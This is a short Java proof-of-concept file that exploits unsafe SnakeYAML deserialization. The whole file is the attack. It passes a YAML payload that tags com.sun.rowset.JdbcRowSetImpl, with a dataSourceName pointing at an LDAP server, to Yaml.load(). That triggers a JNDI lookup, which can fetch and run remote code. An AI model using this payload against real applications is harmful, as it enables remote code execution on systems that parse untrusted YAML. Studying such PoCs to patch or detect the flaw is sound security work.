package org.dili.snakeyaml;

import org.yaml.snakeyaml.Yaml;

public class PocJdbcRowSetImpl {
    public static void main(String[] args) {
        String poc = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:1389/5cjybz, autoCommit: true}";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}

